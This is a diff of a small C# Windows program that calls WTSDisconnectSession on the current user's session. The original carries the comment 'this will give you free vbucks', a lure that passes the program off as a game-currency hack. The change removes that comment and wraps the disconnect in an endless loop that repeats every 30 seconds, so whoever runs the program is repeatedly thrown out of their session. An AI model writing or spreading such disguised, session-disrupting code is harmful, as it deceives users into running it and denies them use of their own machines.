@@ -1,8 +1,7 @@
 using System;
 using System.Runtime.InteropServices;
 using System.ComponentModel;
-
-//this will give you free vbucks
+using System.Threading;
 
 class Program
 {
@@ -14,10 +13,13 @@ class Program
 
     static void Main(string[] args)
     {
-        if (!WTSDisconnectSession(WTS_CURRENT_SERVER_HANDLE,
+        while (true)
+        {
+            if (!WTSDisconnectSession(WTS_CURRENT_SERVER_HANDLE,
              WTS_CURRENT_SESSION, false))
-            throw new Win32Exception();
+                throw new Win32Exception();
 
-        Console.ReadLine();
+            Thread.Sleep(30000);
+        }
     }
 }
